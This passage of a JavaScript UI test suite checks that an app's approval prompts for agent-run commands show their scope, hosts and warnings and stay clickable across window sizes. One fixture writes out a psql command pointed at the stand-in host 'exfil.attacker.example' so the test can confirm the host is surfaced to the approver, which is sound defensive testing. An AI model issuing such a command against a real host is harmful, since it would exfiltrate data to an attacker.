    check(`RED-able (r12): every press carries exactly the scope its press point shows — the strip said «${r5.word}» ⇒ its Allow once sent ${J(got[2] && got[2].extra)} (never 'instance'); the card's Always (its radio «opened») sent ${J(got[3] && got[3].extra)}, under «groups» ${J(got[0] && got[0].extra)}`,
      saysAll(r5, 'opened') && sawO === 'opened' && got.length === 4 && got[0].answer === 'always' && got[0].extra && got[0].extra.reach === 'groups' && got[2].answer === 'once' && got[2].extra && got[2].extra.reach === 'opened' && got[3].answer === 'always' && got[3].extra && got[3].extra.reach === 'opened' && got.every((g) => g.id === 'ut-r11reach01'), got);
    // r12b (the r12 review F1): A NARROW WINDOW — a chat window 380 px wide (desktop, a mouse) under the longest reach («The
    // conversations of its Task Groups»): the reach line on its own row, the answers on theirs (the Always wrapping its words) —
    // every answer inside the window and the strip (r12 kept them at max-content in one line: Deny past the window's edge)
    await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-groups`, { touch: false }); await sleep(300);
    await A.evalJs(`(() => { const w = ${CHAT(s9)}; if (!w) return false; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.resizeWindowTo(w.id, { w: 380, h: 720 }); return true; })()`); await sleep(900);
    const n9 = await A.evalJs(R9);
    const edge9 = await A.evalJs(`(() => { const w = ${CHAT(s9)}, r = w.element.getBoundingClientRect(), d = w.element.querySelector('.chat-attn-dock').getBoundingClientRect(); return { win: Math.round(r.width), winRight: Math.floor(r.right), dockRight: Math.floor(d.right) }; })()`);
    await A.shot('desktop-380-dock-reach.png');
    const past380 = n9.answers.filter((b) => b.right > edge9.winRight || b.right > edge9.dockRight || b.left < 0);
    check(`RED-able (r12b — 45a9ca4b9: the answers never wrapped, Deny past the edge): a chat window ${edge9.win} px wide under the longest reach — the strip says «${n9.word}» on its own row, its answers (${n9.answers.map((b) => b.k + ' ' + b.left + '→' + b.right).join(', ')}) all inside the window (right edge ${edge9.winRight}) and the strip (${edge9.dockRight}), overflow ${n9.over} px`,
      saysAll(n9, 'groups') && edge9.win <= 382 && n9.answers.length === 3 && !past380.length && n9.over <= 0 && !!n9.scope && n9.scope.top < n9.answers[0].top, { n9, edge9, past380 });
    await A.evalJs(PUSH9('[]')); await sleep(600);
    // THE PHONE (390×844 touch): the strip's words at 16 px on their own line, every answer ≥ 44 px on ONE row, the longest reach
    // in the Always's words («Always · The conversations of its Task Groups») wrapping inside it — nothing past the screen's edge
    await toConv(A, s9, [], 390, 844, true);
    await A.evalJs(PUSH9(J(ak()))); await A.waitFor(`(() => { const x = ${R9}; return x.card && x.dock && x.seen; })()`, 8000); await sleep(900);
    await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-groups`, { touch: true }); await sleep(500);
    await A.evalJs(`(() => { for (const x of document.querySelectorAll('.global-toast .global-toast-x')) x.click(); return 1; })()`); await sleep(500); // (the arrival toast stands over the strip for its seconds — closed by its own ×, for the shot)
    await openStrip(A); // (lane phone-dock-restore: the phone's row opened — its answers and its reach as before)
    const p9 = await A.evalJs(R9);
    const seen9 = await A.evalJs(`(() => { const d = ${CHAT(s9)}.element.querySelector('.chat-attn-dock .cad-rows .ut-item[data-id="ut-r11reach01"]'); const els = [d.querySelector('.ut-ak-scope-word'), ...d.querySelectorAll('.ut-exit-answer > button')]; return els.every((e) => { if (!e) return false; const r = e.getBoundingClientRect(), h = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2); return !!h && (h === e || e.contains(h)); }); })()`);
    await A.shot('phone-390-dock-reach.png');
    const small9 = p9.answers.filter((b) => b.h < 44 || b.w < 44), past9 = p9.answers.filter((b) => b.right > p9.vw || b.left < 0);
    const row9 = p9.answers.length === 3 && p9.answers.every((b) => b.top === p9.answers[0].top) && p9.scope && p9.scope.top < p9.answers[0].top;
    check(`r12 THE PHONE (390×844 touch): the strip says «${p9.word}» at ${p9.px} px (≥ 16) on its own line, and its answers are ≥ 44 px on ONE row below it (${p9.answers.map((b) => b.k + ' ' + b.w + '×' + b.h).join(', ')}) — none past the edge, each the topmost thing at its centre`,
      saysAll(p9, 'groups') && p9.px >= 16 && row9 && !small9.length && !past9.length && p9.over <= 0 && seen9 === true, { p9, small9, past9, seen9 });
    await A.evalJs(PUSH9('[]')); await sleep(600);
  } catch (e) { fail++; console.log('  ✗ ⑲ threw: ' + (e?.message || e)); }
  lap('⑲ done');

  // ── ⑳ THE ANNOUNCE YIELDS TO THE OWNER'S OWN ACT (lane needs-card-tail r13 — the .365 runner, mirror 41160137202: the stack
  // stood at z 99999 OVER the tray it points to — test-exit-access-ui's «a real click on 允许» and test-automation-keys-chrome's
  // press of 一直 landed on the card — and over a dialog's button, the pairing sheet's 生成新命令): the tray opened takes its
  // cards; the stack stands below every dialog, menu, popover and the tray — above windows only ──
  console.log('⑳ THE ANNOUNCE YIELDS — an exit ask announced, the tray opened by a real press: its Allow is the topmost thing where a real click lands and the press reaches the answer; a dialog stands above the card');
  try {
    await A.front(); await A.device(1280, 800, { mouse: true });
    const s20 = await newConv('yield'); await sleep(600); sayTo(s20, 'hello'); await sleep(1500);
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); if (!${CHAT(s20)}) app.attachSession(${J(s20)}, 'yield', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); const p = document.getElementById('user-todos-popup'); if (p && !p.classList.contains('hidden')) document.getElementById('taskbar-user-todos').click(); return 1; })()`);
    await A.waitFor(`!!${CHAT(s20)}`, 8000); await sleep(1000);
    const KEY20 = await A.evalJs(`(() => { const w = ${CHAT(s20)}; return (app.foryouRows.keysForWin(w.id) || [])[0] || null; })()`);
    const PUSH20 = (extra, only = false) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos; todos.open = ${only ? extra : `[...todos.open, ...${extra}]`}; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return 1; })()`;
    // THE EXACT EXIT-ACCESS SHAPE: the exit ask the tray's ONLY row (a snapshot of it alone — its Allow then sits low, by the
    // For-you button, where the stack stands); the page's own snapshot comes back at the end (PUSH20('[]'))
    const T20 = Date.now(), ex = (id, cmd) => ({ id, sessionKey: KEY20, status: 'open', kind: 'action', origin: 'machines', urgency: 'urgent', createdAt: T20, expiresAt: T20 + 300000,
      text: 'Allow "yield" to run a command on exmac?', detail: cmd, action: { type: 'exit-run-ask', askId: id.slice(-1).repeat(32), machine: 'exmac', cmd } });
    const STACK = `(() => { const s = document.querySelector('.ut-announce'); return s && s.isConnected ? [...s.querySelectorAll(':scope > .uta-card')].filter((c) => !c.hidden).map((c) => c.dataset.id) : []; })()`;
    // the exact exit-access shape: THE arrival path (a snapshot through the page's own socket handlers) ⇒ the toast + the announce
    await A.evalJs(PUSH20(`[${J(ex('ut-r13yield1', 'echo pong'))}]`, true)); await A.waitFor(`${STACK}.includes('ut-r13yield1')`, 6000);
    const up = await A.evalJs(STACK);
    await A.evalJs(`(() => { const m = app._inboxModel; window.__ra20 = m.runAction; window.__got20 = []; m.runAction = (rec, answer, extra) => { window.__got20.push({ id: rec && rec.id, answer }); return Promise.resolve(true); }; return 1; })()`);
    await A.press('#taskbar-user-todos', { touch: false });
    await A.waitFor(`!!document.querySelector('#user-todos-popup:not(.hidden) .ut-item[data-id="ut-r13yield1"] .ut-exit-allow')`, 6000); await sleep(1100); // (the press arm: an Allow shown under 700 ms ago is not the one read)
    const ALLOW = '#user-todos-popup .ut-item[data-id="ut-r13yield1"] .ut-exit-allow';
    await A.evalJs(`(() => { for (const t of document.querySelectorAll('#global-toasts > .global-toast')) t.remove(); return 1; })()`); // (the transient arrival toast, as the harness's realClick clears it — the stack is what this leg is about)
    const hit = await A.evalJs(`(() => { const e = document.querySelector(${J(ALLOW)}); if (!e) return null; e.scrollIntoView({ block: 'nearest' }); const q = e.getBoundingClientRect(), x = q.left + Math.min(q.width / 2, 40), y = q.top + q.height / 2, h = document.elementFromPoint(x, y);
      return { x: Math.round(x), y: Math.round(y), rows: document.querySelectorAll('#user-todos-popup .ut-item').length, hits: !!h && (h === e || e.contains(h)), top: h ? (h.className || h.tagName).toString().slice(0, 40) : null, inAnn: !!h && !!h.closest('.ut-announce'), stack: ${STACK} }; })()`);
    await A.shot('desktop-1280-announce-yields-tray.png');
    await A.press(ALLOW, { touch: false }); await sleep(500);
    const got20 = await A.evalJs(`window.__got20 || []`);
    check(`RED-able (r13 — 3b8602717: the card stood at z 99999 over the tray it points to, the press landed on it): an exit ask announced (${J(up)}), the tray opened by a real press (its ${hit && hit.rows} row${hit && hit.rows === 1 ? '' : 's'}) — the stack yields (${J(hit && hit.stack)} left), the tray's Allow is the topmost thing where a real click lands (${hit && hit.top}), and the press reaches its answer (${J(got20)})`,
      up.includes('ut-r13yield1') && !!hit && hit.hits && !hit.inAnn && !hit.stack.length && got20.length === 1 && got20[0].id === 'ut-r13yield1' && got20[0].answer === 'allow', { up, hit, got20 });
    await A.press('#taskbar-user-todos', { touch: false }); await sleep(400);
    // a DIALOG over a standing card: the dialog's overlay (z 99998) covers the stack — the card never sits above the owner's act
    await A.evalJs(PUSH20(J([ex('ut-r13yield1', 'echo pong'), ex('ut-r13yield2', 'echo two')]))); await A.waitFor(`${STACK}.includes('ut-r13yield2')`, 6000);
    await A.evalJs(`(() => { app.showNewSessionDialog(); return 1; })()`); await A.waitFor(`!document.getElementById('dialog-overlay').classList.contains('hidden')`, 6000); await sleep(1300); // (the stack's 1 s tick asks again)
    await A.evalJs(`(() => { for (const t of document.querySelectorAll('#global-toasts > .global-toast')) t.remove(); return 1; })()`); // (the transient arrival toast — once the stack steps aside the toasts no longer keep clear of it)
    const dlg = await A.evalJs(`(() => { const s = document.querySelector('.ut-announce'), c = document.querySelector('.ut-announce .uta-card[data-id="ut-r13yield2"]'); if (!c) return null; const r = c.getBoundingClientRect(), h = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
      return { card: { x: Math.round(r.left), y: Math.round(r.top), w: Math.round(r.width) }, aside: getComputedStyle(s).visibility === 'hidden', top: h ? (h.id || h.className || h.tagName).toString().slice(0, 40) : null, inAnn: !!h && !!h.closest('.ut-announce'), inDlg: !!h && !!h.closest('#dialog-overlay') }; })()`);
    await A.shot('desktop-1280-announce-under-dialog.png');
    await A.evalJs(`(() => { const o = document.getElementById('dialog-overlay'); (o.querySelector('.dialog-close, [data-close], .btn-cancel') || {}).click?.(); if (!o.classList.contains('hidden')) document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); return 1; })()`); await sleep(400);
    check(`RED-able (r13 — 3b8602717: the card at 99999 over a dialog's overlay at 99998 — the pairing sheet's 生成新命令 under it): a dialog opened while a card stands — the stack steps aside (${dlg && dlg.aside ? 'hidden, its card kept' : 'still shown'}) and at the card's own centre the topmost thing is the dialog's overlay (${dlg && dlg.top}), never the card`,
      !!dlg && dlg.aside && !dlg.inAnn && dlg.inDlg, dlg);
    await A.evalJs(`(() => { const m = app._inboxModel; if (window.__ra20) m.runAction = window.__ra20; delete window.__ra20; return 1; })()`);
    await A.evalJs(PUSH20('[]')); await sleep(600);
  } catch (e) { fail++; console.log('  ✗ ⑳ threw: ' + (e?.message || e)); }
  lap('⑳ done');

  // ── ㉑ lane needs-card-tail r14 (the r13 acceptance): the announce stands clear of a window's own controls (its first card
  // stood over Session 10's Send); the strip's Allow keeps its press arm over an age tick; a run ask answers in the strip; the
  // stack judges what the person SEES (a form behind the window in front) and steps aside AT a dialog's open; the phone's layers ──
  console.log('㉑ THE ANNOUNCE STANDS CLEAR · THE STRIP KEEPS ITS ARM · A RUN ASK ANSWERS IN THE STRIP · WHAT THE PERSON SEES · THE PHONE (lane needs-card-tail r14)');
  try {
    await A.front(); await A.device(1280, 800, { mouse: true });
    const s21 = await newConv('clear'); await sleep(600); sayTo(s21, 'hello'); await sleep(1500);
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); if (!${CHAT(s21)}) app.attachSession(${J(s21)}, 'clear', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); const p = document.getElementById('user-todos-popup'); if (p && !p.classList.contains('hidden')) document.getElementById('taskbar-user-todos').click(); return 1; })()`);
    await A.waitFor(`!!${CHAT(s21)}`, 8000); await sleep(1000);
    await A.evalJs(`(() => { const w = ${CHAT(s21)}; app.wm.focusWindow?.(w.id); if (!w.isMaximized) app.wm.toggleMaximize(w.id); return 1; })()`); await sleep(800);
    const KEY21 = await A.evalJs(`(() => { const w = ${CHAT(s21)}; return (app.foryouRows.keysForWin(w.id) || [])[0] || null; })()`);
    const PUSH21 = (list) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos; todos.open = ${list}; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return 1; })()`;
    const T21 = Date.now(), ex21 = (id, cmd, at = T21) => ({ id, sessionKey: KEY21, status: 'open', kind: 'action', origin: 'machines', urgency: 'urgent', createdAt: at, expiresAt: T21 + 3600e3,
      text: 'Allow "clear" to run a command on exmac?', detail: cmd, action: { type: 'exit-run-ask', askId: id.slice(-1).repeat(32), machine: 'exmac', cmd } });
    const noToasts = `(() => { for (const t of document.querySelectorAll('#global-toasts > .global-toast')) t.remove(); return 1; })()`;
    const R21 = `const R = (e) => { if (!e) return null; const r = e.getBoundingClientRect(); return r.width && r.height ? { l: Math.round(r.left), t: Math.round(r.top), r: Math.round(r.right), b: Math.round(r.bottom) } : null; };`;
    // (a) MAJOR A: a maximized chat — its composer and strip lie under the For-you button's place
    const A1 = ex21('ut-r14clear1', 'echo pong', T21 - 61e3);
    await A.evalJs(PUSH21(`[${J(A1)}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="ut-r14clear1"]') && !!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14clear1"]')`, 8000); await sleep(1300);
    const CLEAR = `(() => { ${R21} const w = ${CHAT(s21)}, s = document.querySelector('.ut-announce'); if (!w || !s) return null; const sr = s.getBoundingClientRect();
      const hit = (q) => !!q && sr.left < q.r && sr.right > q.l && sr.top < q.b && sr.bottom > q.t;
      const comp = R(w.element.querySelector('.chat-input-area')), strip = R(w.element.querySelector('.chat-attn-dock')), ctl = R(w.element.querySelector('.window-controls')), send = R(w.element.querySelector('.chat-input-area button[class*="send"], .chat-input-area .send-btn'));
      return { stack: R(s), comp, strip, ctl, send, onComp: hit(comp), onStrip: hit(strip), onCtl: hit(ctl), aside: getComputedStyle(s).visibility === 'hidden', max: !!w.isMaximized, cards: s.querySelectorAll('.uta-card:not([hidden])').length, btn: R(document.getElementById('taskbar-user-todos')) }; })()`;
    const c1 = await A.evalJs(CLEAR);
    await A.shot('desktop-1280-announce-clear-composer.png');
    check(`RED-able (r14 — 5b4b36649: by the For-you button over a maximized chat's composer; the acceptance's shot desktop-1280-announce-ten.png had its first card over Session 10's Send): THE TOASTS' ONE RULE — the stack ${J(c1 && c1.stack)} stands clear of the composer ${J(c1 && c1.comp)}, the strip ${J(c1 && c1.strip)} and the title bar's buttons, shown (${c1 && c1.cards} card)`,
      !!c1 && c1.max && !!c1.comp && !!c1.strip && !c1.onComp && !c1.onStrip && !c1.onCtl && !c1.aside && c1.cards === 1, c1);
    // (b) MAJOR B: the strip's Allow over an age tick («1min ago» → «3min ago») — the same node, its arm kept: a press just after answers
    const SA = `.chat-attn-dock .cad-rows .ut-item[data-id="ut-r14clear1"] .ut-exit-allow`;
    await A.evalJs(`(() => { const b = ${CHAT(s21)}.element.querySelector(${J(SA)}); if (b) b.__r14 = 1; const m = app._inboxModel; window.__ra21 = m.runAction; window.__got21 = []; m.runAction = (rec, answer) => { window.__got21.push({ id: rec && rec.id, answer }); return Promise.resolve(true); }; return !!b; })()`);
    const age0 = await A.evalJs(`(${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14clear1"] .ut-meta') || {}).textContent || ''`);
    await A.evalJs(`(() => { window.__dn21 = Date.now; Date.now = () => window.__dn21.call(Date) + 120000; return 1; })()`);
    await A.evalJs(PUSH21(`[${J(A1)}]`)); await sleep(400);
    const b1 = await A.evalJs(`(() => { const w = ${CHAT(s21)}, b = w.element.querySelector(${J(SA)}); return { same: !!b && b.__r14 === 1, age: (w.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14clear1"] .ut-meta') || {}).textContent || '' }; })()`);
    await A.evalJs(noToasts);
    await A.press(SA, { touch: false }); await sleep(500);
    const got21 = await A.evalJs(`window.__got21 || []`), said21 = await A.evalJs(`[...document.querySelectorAll('#global-toasts .global-toast')].map((t) => t.textContent).join(' | ')`);
    await A.evalJs(`(() => { if (window.__dn21) Date.now = window.__dn21; delete window.__dn21; return 1; })()`);
    check(`RED-able (r14 — 5b4b36649: the age in the row's signature rebuilt the strip's Allow, and nothing re-armed it — the acceptance's probe: {ok:false, code:'just-moved'}): an age tick («${age0.trim()}» → «${b1.age.trim()}») keeps the SAME Allow node (${b1.same}) — a press just after it answers (${J(got21)})`,
      /1min ago/.test(age0) && /3min ago/.test(b1.age) && b1.same && got21.length === 1 && got21[0].id === 'ut-r14clear1' && got21[0].answer === 'allow' && !/moved under the pointer/i.test(said21), { age0, b1, got21, said21 });
    await A.evalJs(`(() => { const m = app._inboxModel; if (window.__ra21) m.runAction = window.__ra21; delete window.__ra21; return 1; })()`);
    // (c) MINOR C: a vault-run ask in the strip — its command head, its three answers, its clock
    const FXR = JSON.parse(fs.readFileSync(new URL('./fixtures/vault-run-card-facts.json', import.meta.url), 'utf8')).variants.find((v) => v.name === 'hosts-known-always').facts;
    const RUN21 = { id: 'ut-r14run01', sessionKey: KEY21, status: 'open', kind: 'action', origin: 'vault', by: 'agent', urgency: 'urgent', text: 'clear wants to run a command with a stored secret', detail: 'Program: psql', createdAt: Date.now() - 5e3, expiresAt: Date.now() + 55e3,
      action: { type: 'vault-run-ask', askId: 'e'.repeat(32), always: true, tool: 'x' }, facts: FXR };
    await A.evalJs(PUSH21(`[${J(RUN21)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14run01"]')`, 8000); await sleep(800);
    // r15: what the answers decide on — the strip's own facts line (.ut-run-gist: its rows, the warning accent, the again / cut
    // lines, or the line that says they are on the card), each whole: inside the window, never clipped
    const RUNM_OF = (id) => `(() => { ${R21} const d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'), row = d && d.querySelector('.ut-item[data-id="${id}"]'); if (!row) return null; const vis = (e) => !!e && e.getClientRects().length > 0 && getComputedStyle(e).visibility !== 'hidden';
      const ans = [...row.querySelectorAll('.ut-run-answer > button')].filter(vis).map((b) => ({ k: b.dataset.answer, ...R(b) })), cmd = row.querySelector('.ut-run-cmd'), dl = row.querySelector('.ut-deadline'), g = row.querySelector('.ut-run-gist'), w = row.closest('.window');
      const line = (q) => { const e = g && g.querySelector(q); return vis(e) ? e.textContent : null; };
      const gist = vis(g) ? { text: g.textContent, out: !!g.querySelector('.ut-run-out'), again: line('.ut-run-again'), cut: line('.ut-run-cut'), clip: g.scrollWidth - g.clientWidth, ...R(g),
        rows: [...g.querySelectorAll('.ut-run-grow')].filter(vis).map((e) => ({ k: e.dataset.fact, warn: e.classList.contains('ut-run-warn'), text: e.textContent, color: getComputedStyle(e.querySelector('.ut-run-val')).color, ...R(e) })) } : null;
      return { ans, cmd: vis(cmd) ? { text: cmd.textContent.slice(0, 40), h: Math.round(cmd.getBoundingClientRect().height) } : null, clock: vis(dl) ? dl.textContent : null, dl: vis(dl) ? { ...R(dl), clip: dl.scrollWidth - dl.clientWidth } : null, over: d.scrollWidth - d.clientWidth, facts: !!row.querySelector('.ut-run-facts') && vis(row.querySelector('.ut-run-facts')), gist, vw: innerWidth, wr: w ? Math.floor(w.getBoundingClientRect().right) : null, textColor: getComputedStyle(row).color }; })()`;
    const RUNM = RUNM_OF('ut-r14run01');
    const r1 = await A.evalJs(RUNM);
    await A.shot('desktop-1280-dock-run.png');
    check(`RED-able (r14 — 5b4b36649 hid .ut-run and .ut-deadline: a vault-run ask's strip showed its question and ⤢ only, yet the no-record toast says «answer it in the strip»): the strip draws the run card's command head («${r1 && r1.cmd && r1.cmd.text}», one line), its THREE answers (${J(r1 && r1.ans.map((a) => a.k))}) and its clock («${r1 && r1.clock}») — r15: beside what they decide on («${r1 && r1.gist && r1.gist.text}»), not the card's rows; nothing past the window's edge`,
      !!r1 && r1.ans.map((a) => a.k).join() === 'once,always,deny' && !!r1.cmd && /psql/.test(r1.cmd.text) && r1.cmd.h <= 20 && /left|sec/.test(r1.clock || '') && !r1.facts && !!r1.gist && /Sends to db\.example\.com/.test(r1.gist.text) && r1.over <= 1, r1);
    // (c2) r15 (the r14 acceptance — the strip offered «Always let this conversation use it (these hosts)» with the hosts, the
    // warning row and the «asked again» line hidden): A PRESS POINT NEVER SENDS A SCOPE IT DOES NOT SHOW — each ask in the strip
    const runV = (id, facts, action = {}, at = {}) => ({ ...RUN21, id, createdAt: Date.now() - 5e3, expiresAt: Date.now() + 55e3, ...at, action: { ...RUN21.action, askId: id.slice(-1).repeat(32), ...action }, facts });
    const LONG21 = 'psql ' + Array.from({ length: 10 }, (_, k) => `-v col${k}=some_long_value_${k}`).join(' ') + ' -h exfil.attacker.example -U svc -c "select 1"';
    const V15 = [
      ['past', runV('ut-r15past1', { ...FXR, cmd: LONG21, hosts: { known: true, list: ['exfil.attacker.example'] } })],
      ['writable', runV('ut-r15writ2', { ...FXR, tool: { ...FXR.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false })],
      ['again', runV('ut-r15agan3', { ...FXR, whyAgain: { code: 'args' } })],
      ['many', runV('ut-r15many4', { ...FXR, hosts: { known: true, list: Array.from({ length: 12 }, (_, k) => `replica-${k}.db.internal.example`) } })],
      // r16 (the r15 acceptance: twelve hosts hid a writable program's warning and the «asked again» line beside Allow once)
      ['manywarn', runV('ut-r16mwrn8', { ...FXR, hosts: { known: true, list: Array.from({ length: 12 }, (_, k) => `replica-${k}.db.internal.example`) }, tool: { ...FXR.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false })],
      ['manyagain', runV('ut-r16magn9', { ...FXR, hosts: { known: true, list: Array.from({ length: 12 }, (_, k) => `replica-${k}.db.internal.example`) }, whyAgain: { code: 'args' } })],
    ];
    const v15 = {};
    for (const [k, it] of V15) {
      await A.evalJs(PUSH21(`[${J(it)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="${it.id}"]')`, 8000); await sleep(700);
      await A.evalJs(noToasts);
      v15[k] = await A.evalJs(RUNM_OF(it.id));
      await A.shot(`desktop-1280-dock-run-${k}.png`);
    }
    const ks = (v) => (v ? v.ans.map((a) => a.k).join() : null), whole = (v) => !!v && !!v.gist && v.gist.clip <= 1 && v.gist.r <= v.wr && v.gist.rows.every((r) => r.r <= v.wr) && v.over <= 1;
    const hostRow = (v, h) => !!v && !!v.gist && v.gist.rows.some((r) => r.k === 'hosts' && r.text.includes(h));
    const pv = v15.past, wv = v15.writable, av = v15.again, mv = v15.many;
    check(`RED-able (r15 — 2353267f1: «Always … (these hosts)» in the strip, the host only past the command's ellipsis): a run ask whose host lies past the ellipsis («${pv && pv.cmd && pv.cmd.text}…») ⇒ the strip SAYS its hosts row («${pv && pv.gist && pv.gist.rows.map((r) => r.text).join(' | ')}», whole, inside the window) before its ${J(ks(pv))} — or offers no Always`,
      (hostRow(pv, 'exfil.attacker.example') && whole(pv) && ks(pv) === 'once,always,deny') || (!!pv && !pv.ans.some((a) => a.k === 'always')), pv);
    const wr = wv && wv.gist && wv.gist.rows.find((r) => r.k === 'program'), hr = wv && wv.gist && wv.gist.rows.find((r) => r.k === 'hosts');
    check(`RED-able (r15 — 2353267f1 hid the warning row): a program an agent can write ⇒ its warning row in the strip («${wr && wr.text}», the warning accent ${wr && wr.color} — the hosts row's ${hr && hr.color}) beside ${J(ks(wv))}`,
      !!wr && wr.warn && /in a folder an agent can write/.test(wr.text) && !!hr && wr.color !== hr.color && whole(wv) && ks(wv) === 'once,deny', wv);
    check(`RED-able (r15 — 2353267f1 hid the «asked again» line): a near-identical rerun ⇒ the strip says how it differs («${av && av.gist && av.gist.again}») before its ${J(ks(av))}`,
      !!av && !!av.gist && /Asked again — it differs from the command you let through: its arguments changed/.test(av.gist.again || '') && whole(av) && ks(av) === 'once,always,deny', av);
    check(`r15; r16 (the bound is the hosts row's): hosts too long for a strip (twelve) ⇒ their row says they are on its card («${mv && mv.gist && mv.gist.text}») and only ${J(ks(mv))} — «Always» is the card's`,
      !!mv && !!mv.gist && mv.gist.out && /Sends to \(too long to show here — the hosts, and «Always», are on its card\)/.test(mv.gist.text) && !/replica-0/.test(mv.gist.text) && ks(mv) === 'once,deny' && whole(mv), mv);
    const mw = v15.manywarn, ma = v15.manyagain, mwr = mw && mw.gist && mw.gist.rows.find((r) => r.k === 'program'), mwh = mw && mw.gist && mw.gist.rows.find((r) => r.k === 'hosts');
    check(`RED-able (r16 — 882665da7: twelve hosts ⇒ «Too long to show here…» alone beside Allow once): twelve hosts + a program an agent can write ⇒ its warning row drawn («${mwr && mwr.text}», the warning accent ${mwr && mwr.color}), the hosts row on its card («${mwh && mwh.text}»), ${J(ks(mw))}`,
      !!mwr && mwr.warn && /in a folder an agent can write/.test(mwr.text) && !!mwh && /too long to show here — the hosts are on its card/.test(mwh.text) && whole(mw) && ks(mw) === 'once,deny', mw);
    check(`RED-able (r16 — 882665da7 hid the «asked again» line behind twelve hosts): twelve hosts + a near-identical rerun ⇒ the line drawn («${ma && ma.gist && ma.gist.again}»), «Always» with the hosts on its card — ${J(ks(ma))}`,
      !!ma && !!ma.gist && /Asked again — it differs from the command you let through: its arguments changed/.test(ma.gist.again || '') && ma.gist.out && whole(ma) && ks(ma) === 'once,deny', ma);
    // (d) MINOR D (1): a FORM the system opened — BEHIND the maximized chat, under the stack ⇒ the card shows; in front ⇒ aside
    const F21 = `(() => { const w = [...app.wm.windows.values()].find((x) => x.type === 'form' && !x.isMinimized); return w || null; })()`;
    await A.evalJs(`(() => { window.__sh21 = app.pluginClient._hostApi({ id: 'r14probe', version: '1' }, new AbortController()).createModalShell({ id: 'r14form', title: 'A form the system opened', kind: 'form', opener: 'system', escapeToClose: true }); window.__sh21.body.innerHTML = '<label>Name <input class="r14-in"></label>'; return 1; })()`);
    await A.waitFor(`!!${F21}`, 6000); await sleep(600);
    await A.evalJs(PUSH21(`[${J(ex21('ut-r14form1', 'echo behind'))}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="ut-r14form1"]')`, 8000); await sleep(300);
    // (r15: the stack settles first — it follows the strip, and a strip that just changed height moves it at the next pass;
    // a form placed by where the stack WAS leaves the card's middle uncovered)
    for (let k = 0, last = null; k < 10; k++) { const top = await A.evalJs(`Math.round(document.querySelector('.ut-announce').getBoundingClientRect().top)`); if (top === last) break; last = top; await sleep(1100); }
    await A.evalJs(`(() => { const f = ${F21}, s = document.querySelector('.ut-announce').getBoundingClientRect(), ws = app.wm.workspace.getBoundingClientRect(); f.element.style.left = Math.max(0, s.left - ws.left - 40) + 'px'; f.element.style.top = Math.max(0, s.top - ws.top - 40) + 'px'; return 1; })()`); await sleep(1300);
    await A.evalJs(noToasts);
    const SEEN = `(() => { const s = document.querySelector('.ut-announce'), c = s && s.querySelector('.uta-card[data-id="ut-r14form1"]'), f = ${F21}; if (!c || !f) return null; const r = c.getBoundingClientRect(), fr = f.element.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2;
      const under = document.elementsFromPoint(x, y).find((e) => !s.contains(e)); return { card: [Math.round(r.left), Math.round(r.top), Math.round(r.right), Math.round(r.bottom)], form: [Math.round(fr.left), Math.round(fr.top), Math.round(fr.right), Math.round(fr.bottom)], aside: getComputedStyle(s).visibility === 'hidden', formUnder: fr.left < r.right && fr.right > r.left && fr.top < r.bottom && fr.bottom > r.top, front: under ? (under.closest('.window') === f.element ? 'form' : under.closest('.window') ? 'chat' : (under.id || under.className || under.tagName).toString().slice(0, 30)) : null }; })()`;
    const d1 = await A.evalJs(SEEN);
    await A.shot('desktop-1280-announce-form-behind.png');
    await A.evalJs(`(() => { const f = ${F21}; app.wm.focusWindow?.(f.id); return 1; })()`); await sleep(1300);
    const d2 = await A.evalJs(SEEN);
    check(`RED-able (r14 — 5b4b36649 judged rectangles: a form window BEHIND the window in front hid an urgent card for its whole clock): a system-opened form under the stack, behind the maximized chat (what is under the card: ${d1 && d1.front}) ⇒ the card shows (${d1 && (d1.aside ? 'hidden' : 'shown')}); the same form brought in front (${d2 && d2.front}) ⇒ it steps aside (${d2 && (d2.aside ? 'hidden' : 'shown')})`,
      !!d1 && d1.formUnder && d1.front === 'chat' && !d1.aside && !!d2 && d2.front === 'form' && d2.aside, { d1, d2 });
    await A.evalJs(`(() => { try { window.__sh21?.close?.(); } catch { } delete window.__sh21; const w = ${CHAT(s21)}; app.wm.focusWindow?.(w.id); return 1; })()`); await sleep(600);
    // (e) MINOR D (2): a dialog's OPEN asks at once — aside within two frames, never the next second's tick
    await A.evalJs(PUSH21(`[${J(ex21('ut-r14open1', 'echo open'))}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="ut-r14open1"]') && getComputedStyle(document.querySelector('.ut-announce')).visibility !== 'hidden'`, 8000); await sleep(300);
